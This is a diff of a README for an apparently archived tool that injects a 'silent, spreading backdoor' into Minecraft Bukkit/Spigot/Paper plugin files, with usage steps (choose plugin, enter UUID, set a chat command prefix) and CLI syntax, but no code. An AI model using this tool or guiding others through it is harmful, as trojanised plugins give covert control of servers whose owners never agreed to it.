@@ -1,11 +1,12 @@
 
 
-# For educational purposes only. Do not use on a server without permission.
+
+# For educational purposes only. Do not attempt to install on a server you do not own.
 
 A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
 Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.
 
-
+This is an archived repo, no support will be offered, and no bugs will be fixed.
 
 ## Requirements:
 * Java 8 runtime.
@@ -16,8 +17,7 @@ Using the injector is recommended, should you choose to manually backdoor a plug
 * Select desired plugin file.
 * Input your Minecraft UUID.
 * Input chat command prefix. (Default: #)
-## Known Issue
-If you have an issue similar to [Issue 82](https://github.com/ThiccIndustries/Minecraft-Backdoor/issues/82), try placing the backdoor into its own folder, and running from there. Do not try to run from the Start Menu.
+
 ## CLI Usage:
 Java -jar backdoor.jar (filename) [options]
 * --help / -h : Display syntax message in console
